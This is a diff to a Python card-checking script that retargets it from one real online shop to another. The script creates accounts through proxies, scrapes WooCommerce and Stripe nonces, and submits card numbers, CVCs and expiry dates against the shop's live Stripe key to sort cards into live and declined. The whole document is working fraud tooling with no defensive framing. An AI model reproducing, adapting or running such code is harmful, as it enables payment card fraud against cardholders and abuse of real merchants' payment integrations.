@@ -14,7 +14,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # Headers for Stripe request
 stripe_headers = {
     'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.7',
+    'accept-language': 'en-US,en;q=0.6',
     'content-type': 'application/x-www-form-urlencoded',
     'origin': 'https://js.stripe.com',
     'priority': 'u=1, i',
@@ -96,7 +96,7 @@ def create_new_account(session, proxy_str):
         proxies = parse_proxy(proxy_str)
         
         # Step 1: Get login nonce
-        login_page_res = session.get('https://firstcornershop.com/my-account/', proxies=proxies, timeout=30)
+        login_page_res = session.get('https://butcher.ie/my-account/', proxies=proxies, timeout=30)
         
         login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
         if not login_nonce_match:
@@ -113,7 +113,7 @@ def create_new_account(session, proxy_str):
             'register': 'Register',
         }
         
-        reg_response = session.post('https://firstcornershop.com/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
+        reg_response = session.post('https://butcher.ie/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
         
         # Check if registration was successful
         if reg_response.status_code in [302, 303]:
@@ -129,7 +129,7 @@ def get_payment_nonce(session, proxy_str):
     try:
         proxies = parse_proxy(proxy_str)
         
-        payment_page_res = session.get('https://firstcornershop.com/my-account/add-payment-method/', proxies=proxies, timeout=30)
+        payment_page_res = session.get('https://butcher.ie/my-account/add-payment-method/', proxies=proxies, timeout=30)
         payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
         if not payment_nonce_match:
             return None, "Failed to get payment nonce"
@@ -464,7 +464,7 @@ DECLINED CC ❌
 """
 
         # Prepare Stripe data with the current card
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=ZW&payment_user_agent=stripe.js%2F53a74093af%3B+stripe-js-v3%2F53a74093af%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffirstcornershop.com&time_on_page=105133&client_attribution_metadata[client_session_id]=7bc29799-34f4-43ec-97ed-7c847b3ba363&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=290781b5-8373-4375-976f-8c2fd50403b0&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=aaf5afa0-fe5c-4bd0-a003-2aa9130a03079dd6fb&muid=59c21fbb-a6c5-4dca-a7f0-75860ac68588146bf7&sid=e4a7361c-0155-4213-bc46-ed9831c9ce0282806c&key=pk_live_51KnIwCBqVauev2abKoSjNWm78cR1kpbtEdrt8H322BjXRXUvjZK2R8iAQEfHPEV9XNOCLmYVADzYkLd96PccE9HN00s4zyYumQ&_stripe_version=2024-06-20'
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number&payment_user_agent=stripe.js%2F5b3d231411%3B+stripe-js-v3%2F5b3d231411%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbutcher.ie&time_on_page=143687&client_attribution_metadata[client_session_id]=4cd78425-de5d-4d48-bc3a-a24df2b85f9c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7888070f-9538-4305-90d9-08e3cf2ef0c7&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=72eb34df-440a-4b37-b0b1-eb1ad548a7eb3c34e3&muid=8d8ff28f-32e1-4581-9f28-a47eb2a745000595b7&sid=25756093-205d-4b72-900b-7decd5ab8fffccacc6&key=pk_live_51IbQ21ItrjNAxRL74KVowqSSvUFQsbInpdW3Nu9IJuNQ00B4cMJGlul12HjkQojXk3L5vvtbvrD4kfEYDvAfu3Nv00NOJyIwrd&_stripe_version=2024-06-20'
 
         proxies = parse_proxy(proxy_str)
         
@@ -479,11 +479,11 @@ DECLINED CC ❌
             # Second request (admin ajax)
             headers2 = {
                 'accept': '*/*',
-                'accept-language': 'en-US,en;q=0.6',
+                'accept-language': 'en-US,en;q=0.7',
                 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://firstcornershop.com',
+                'origin': 'https://butcher.ie',
                 'priority': 'u=1, i',
-                'referer': 'https://firstcornershop.com/my-account/add-payment-method/',
+                'referer': 'https://butcher.ie/my-account/add-payment-method/',
                 'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
@@ -502,7 +502,7 @@ DECLINED CC ❌
                 '_ajax_nonce': ajax_nonce,
             }
 
-            response2 = session.post('https://firstcornershop.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers2, data=data2, proxies=proxies, timeout=30)
+            response2 = session.post('https://butcher.ie/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
             website_response = response2.json()
             
             # Get final message with 3DS info
